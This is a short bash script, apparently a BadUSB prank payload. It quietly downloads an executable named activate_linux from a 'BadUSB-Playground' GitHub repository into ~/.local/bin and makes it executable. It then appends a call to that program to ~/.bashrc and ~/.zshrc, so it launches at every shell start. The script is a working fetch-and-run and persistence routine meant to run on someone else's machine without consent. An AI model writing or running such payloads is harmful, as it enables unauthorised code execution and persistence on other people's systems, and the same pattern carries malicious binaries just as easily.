#!/bin/bash

if ! command -v activate_linux &> /dev/null; then
    wget -qO "$HOME/.local/bin/activate_linux" https://github.com/FalsePhilosopher/BadUSB-Playground/raw/refs/heads/main/Ducky/USBRubberducky/prank/Unix-like/Linux/Activate_linux/activate_linux
    chmod +x "$HOME/.local/bin/activate_linux"
fi

echo '
activate_linux' >> ~/.bashrc

echo '
activate_linux' >> ~/.zshrc
